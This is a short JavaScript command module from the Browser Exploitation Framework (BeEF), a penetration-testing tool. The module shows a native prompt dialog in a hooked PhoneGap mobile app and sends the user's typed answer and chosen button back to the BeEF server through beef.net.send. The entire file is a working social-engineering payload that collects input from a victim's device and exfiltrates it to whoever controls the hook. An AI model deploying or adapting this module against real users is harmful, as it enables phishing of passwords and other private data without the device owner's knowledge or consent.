//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

// Phonegap_prompt_user
//
beef.execute(function() {
    var title = "<%== @title %>";
    var question = "<%== @question %>";
    var ans_yes = "<%== @ans_yes %>";
    var ans_no = "<%== @ans_no %>";
    var result = '';

   
    function onPrompt(results) {
        result = "Selected button number " + results.buttonIndex + " result: " + results.input1;
        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );    
    }

    navigator.notification.prompt(
        question,
        onPrompt,      
        title,         
        [ans_yes,ans_no]
    );
  
});
